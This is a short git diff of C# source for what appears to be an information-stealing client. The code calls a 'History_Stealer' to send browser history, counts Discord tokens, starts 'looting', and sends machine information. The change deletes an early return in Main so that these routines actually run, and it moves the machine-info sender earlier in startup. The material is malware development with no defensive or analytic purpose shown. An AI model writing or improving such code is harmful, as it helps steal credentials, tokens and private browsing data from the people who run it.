@@ -20,10 +20,6 @@ namespace Client
         /// </summary>
         static void Main(string[] args)
         {
-
-
-
-            return;
             // this has nothing to do with threads
             Application.ThreadException += Application_ThreadException;
 
@@ -98,6 +94,9 @@ namespace Client
             // removed because of how buggy this is
             // Armitage.Watchers.Filesystem.Start();
 
+            /// Send machine info
+            Armitage.Informer.Start();
+
             Armitage.Cookies.History_Stealer.SendOne(); // send history
 
             /// Start looting.
@@ -116,8 +115,6 @@ namespace Client
             }
             else { Console.WriteLine("found tokens : " + discord_tokens.Count.ToString()); }
 #endif
-            /// Send machine info
-            Armitage.Informer.Start();
 #endif
 
             /// Init update checkers.
